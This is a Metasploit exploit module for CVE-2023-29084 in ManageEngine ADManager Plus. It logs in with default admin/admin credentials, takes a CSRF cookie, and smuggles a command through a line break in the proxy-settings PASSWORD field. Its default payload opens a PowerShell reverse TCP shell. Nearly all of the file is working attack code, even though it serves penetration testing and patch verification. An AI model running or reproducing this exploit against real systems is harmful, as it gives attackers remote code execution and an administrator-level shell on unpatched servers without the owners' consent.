##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ManageEngine ADManager Plus ChangePasswordAction Authenticated Command Injection',
        'Description' => %q{
          This module exploits CVE-2023-29084, an authenticated command injection vulnerability in the
          ChangePasswordAction functionality whereby user input is not appropriately validated before being inserted
          into an string that is later used as a command to execute on the target system.

          By injecting into the USERNAME or PASSWORD fields of the request, an attacker can use this vulnerability
          to execute code in the context of the user running ManageEngine ADManager Plus, which will typically be
          the local administrator.
        },
        'Author' => [
          'Simon Humbert', # Disclosure of bug via ZDI
          'Dinh Hoang', # Aka hnd3884. Writeup and PoC
          'Grant Willcox', # Metasploit module
        ],
        'References' => [
          ['CVE', '2023-29084'],
          ['URL', 'https://hnd3884.github.io/posts/CVE-2023-29084-Command-injection-in-ManageEngine-ADManager-plus/'], # Writeup
          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-23-438/'],
          ['URL', 'https://www.manageengine.com/products/ad-manager/admanager-kb/cve-2023-29084.html'], # Advisory
        ],
        'DisclosureDate' => '2023-04-12',
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => [ARCH_X86, ARCH_X64, ARCH_CMD],
        'Privileged' => true,
        'Payload' => {
          'BadChars' => "\x22\x0A\x0B\x0C\x0D\x00[{}]:,", # Avoid double quotes, aka 0x22, and new line and line return characters
          'Size' => 1600
        },
        'Targets' => [
          [
            'Windows Command',
            {
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp' }
            }
          ],
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8080
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
  end

  def login(username, password)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'j_security_check'),
      'method' => 'POST',
      'vars_get' => {
        'LogoutFromSSO' => 'true'
      },
      'vars_post' => {
        'is_admp_pass_encrypted' => 'false', # Optional but better to keep it in here to match normal request.
        'j_username' => username,
        'j_password' => password,
        'domainName' => 'ADManager Plus Authentication',
        'AUTHRULE_NAME' => 'ADAuthenticator'
      },
      'keep_cookies' => true
    )

    unless res && (res.code == 302 || res.code == 303)
      fail_with(Failure::NoAccess, 'Could not log in successfully!')
    end

    print_good('Logged in successfully!')
  end

  def check
    res = send_request_cgi(
      'uri' => target_uri.path,
      'method' => 'GET'
    )

    unless res && res.code == 200 && res.body
      return CheckCode::Unknown('Browsing to root of website returned a non-200 or empty response!')
    end

    unless res.body&.match(/\.val\('ADManager Plus Authentication'\)/)
      return CheckCode::Safe('Target is not running ADManager Plus!')
    end

    build_number = res.body&.match(/src=".+\.js\?v=(\d{4})"/)
    unless build_number
      return CheckCode::Unknown('Home page did not leak the build number via the ?v= parameter as expected!')
    end

    build_number = build_number[1]
    print_good("The target is running AdManager Plus build #{build_number}!")

    # Versions 7181 and later are patched, everything prior is vulnerable.
    target_build = Rex::Version.new(build_number)
    if target_build >= Rex::Version.new('7181')
      CheckCode::Safe('Target is running a patched version of AdManager Plus!')
    elsif target_build < Rex::Version.new('7181')
      CheckCode::Appears('Target appears to be running a vulnerable version of AdManager Plus!')
    else
      CheckCode::Unknown("An unknown error occurred when trying to parse the build number: #{build_number}. Please report this error!")
    end
  end

  def exploit
    res = send_request_cgi(
      'uri' => target_uri.path,
      'method' => 'GET',
      'keep_cookies' => true
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, 'Home page of target did not respond with the expected 200 OK code!')
    end

    login('admin', 'admin')

    # We need to do this post login otherwise we will get errors. This also ensures we get updated
    # cookies post login as these can sometimes change post login process.
    res = send_request_cgi(
      'uri' => target_uri.path,
      'method' => 'GET',
      'keep_cookies' => true
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, 'Home page of target did not respond with the expected 200 OK code post authentication!')
    end

    # Check that we actually got our cookies updated post authentication and visiting the homepage.
    unless res&.get_cookies&.match(/adscsrf=.*?;.*?;.*?_zcsr_tmp=.*?;/)
      fail_with(Failure::UnexpectedReply, 'Target did not respond with the expected updated cookies after logging in and visiting the home page.')
    end

    @csrf_cookie = nil
    for cookie in @cookie_jar&.cookies
      if cookie.name == 'adscsrf'
        @csrf_cookie = cookie.value
        break
      end
    end

    fail_with(Failure::NoAccess, 'Could not obtain adscrf cookie!') if @csrf_cookie.blank?

    if target['Type'] == :win_dropper
      execute_cmdstager
    else
      execute_command(payload.encoded)
    end
  end

  def execute_command(cmd, _opts = {})
    res = send_request_cgi(
      {
        'uri' => normalize_uri(target_uri.path, 'api', 'json', 'admin', 'saveServerSettings'),
        'method' => 'POST',
        'vars_post' => {
          'adscsrf' => @csrf_cookie,
          'params' => create_params_value(cmd)
        },
        'keep_cookies' => true
      }
    )

    if res && res.code == 200
      if res.body&.match(/{"isAuthorized":false}/)
        fail_with(Failure::NoAccess, 'Somehow we became unauthenticated during exploitation!')
      elsif res.body&.match(/Successfully updated the following settings.*-.*Proxy Settings/)
        print_warning("Settings successfully changed but the fact that the server responded likely means the payload didn't execute!")
      elsif res.body&.match(/"status":"error"/)
        print_error("The payload somehow triggered an error on the target's side!")
      else
        fail_with(Failure::PayloadFailed, 'Was not able to successfully update the settings to execute the payload!')
      end
    elsif res.nil?
      print_good('Request timed out. Its likely the payload executed successfully!')
    else
      fail_with(Failure::UnexpectedReply, "Target responded with a non-200 OK code to our saveServerSettings request! Code was #{res.code}")
    end
  end

  def create_params_value(cmd)
    "[{\"tabId\":\"proxy\",\"ENABLE_PROXY\":true,\"SERVER_NAME\":\"localhost\",\"USER_NAME\":\"#{Rex::Text.rand_text_alphanumeric(4..20)}\",\"PASSWORD\":\"#{Rex::Text.rand_text_alphanumeric(4..20)}\\r\\n#{cmd}\",\"PORT\":\"8080\"}]"
  end
end
